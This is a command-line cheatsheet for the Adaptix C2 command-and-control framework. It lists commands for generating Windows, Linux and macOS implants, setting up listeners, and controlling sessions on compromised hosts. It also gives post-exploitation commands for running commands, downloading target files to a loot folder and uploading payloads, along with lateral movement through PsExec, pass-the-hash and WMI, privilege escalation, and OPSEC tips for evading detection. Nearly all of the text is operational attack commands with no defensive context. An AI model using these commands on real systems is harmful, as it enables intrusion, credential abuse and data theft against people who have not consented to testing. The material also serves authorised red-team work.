# Adaptix C2 Cheatsheet

## Quick Reference

### Teamserver Operations

```bash
# Start teamserver
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword

# Start teamserver with debug
adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword --debug

# Connect as client
adaptix-c2 client --host <teamserver_ip> --port 7777 --password MySecurePassword
```

### Listener Management

```bash
# Create HTTP listener
adaptix-c2 listener add --type http --host <your_ip> --port 8080 --name http_listener

# Create HTTPS listener
adaptix-c2 listener add --type https --host <your_ip> --port 443 --cert /path/to/cert.pem --key /path/to/key.pem --name https_listener

# List listeners
adaptix-c2 listeners

# Remove listener
adaptix-c2 listener remove --name http_listener
```

### Payload Generation

```bash
# Generate Windows EXE
adaptix-c2 generate --type exe --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.exe

# Generate shellcode
adaptix-c2 generate --type shellcode --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.bin

# Generate DLL
adaptix-c2 generate --type dll --platform windows --arch amd64 --listener http://<your_ip>:8080 --output implant.dll

# Generate Linux ELF
adaptix-c2 generate --type exe --platform linux --arch amd64 --listener http://<your_ip>:8080 --output implant

# Generate macOS Mach-O
adaptix-c2 generate --type exe --platform macos --arch amd64 --listener http://<your_ip>:8080 --output implant.macho
```

### Session Management

```bash
# List sessions
adaptix-c2 sessions

# Interact with session
adaptix-c2 session --id <session_id>

# Kill session
adaptix-c2 session --id <session_id> --kill

# Background session
adaptix-c2 session --id <session_id> --background
```

### Post-Exploitation

```bash
# Execute command
adaptix-c2 session --id <session_id> --execute "whoami"

# Download file
adaptix-c2 session --id <session_id> --download C:\Users\target\file.txt --output /loot/file.txt

# Upload file
adaptix-c2 session --id <session_id> --upload /path/to/payload.exe --output C:\temp\payload.exe

# Port forwarding
adaptix-c2 session --id <session_id> --port-forward --local-port 8080 --remote-host <internal_host> --remote-port 80

# SOCKS proxy
adaptix-c2 session --id <session_id> --socks-proxy --local-port 1080
```

### Lateral Movement

```bash
# PsExec lateral movement
adaptix-c2 session --id <session_id> --lateral-move --target <target_ip> --method psexec

# Pass-the-hash
adaptix-c2 session --id <session_id> --lateral-move --target <target_ip> --method pth --hash <ntlm_hash>

# WMI lateral movement
adaptix-c2 session --id <session_id> --lateral-move --target <target_ip> --method wmi
```

### Privilege Escalation

```bash
# Use built-in privesc module
adaptix-c2 session --id <session_id> --privesc --method <method_name>

# Load custom module
adaptix-c2 session --id <session_id> --load-module /path/to/module.ao
```

### REST API

```bash
# Authenticate
curl -X POST https://<teamserver>:7777/api/login -d '{"username":"admin","password":"MySecurePassword"}'

# List sessions
curl -H "Authorization: Bearer <token>" https://<teamserver>:7777/api/sessions

# Execute command
curl -X POST -H "Authorization: Bearer <token>" https://<teamserver>:7777/api/session/<id>/execute -d '{"command":"whoami"}'

# Generate payload
curl -X POST -H "Authorization: Bearer <token>" https://<teamserver>:7777/api/generate -d '{"type":"exe","platform":"windows","arch":"amd64"}'
```

### Resource Files

```bash
# Run resource file
adaptix-c2 client --resource /path/to/commands.txt

# Execute commands programmatically
adaptix-c2 exec --host <teamserver> --port 7777 --password <pass> --command "sessions"
```

### OPSEC Tips

```bash
# Use sleep jitter
adaptix-c2 session --id <session_id> --sleep-jitter 30-120

# Use encrypted communications
adaptix-c2 listener add --type https --host <your_ip> --port 443 --cert cert.pem --key key.pem

# Rotate infrastructure
adaptix-c2 listener remove --name old_listener
adaptix-c2 listener add --type https --host <new_ip> --port 443 --name new_listener
```
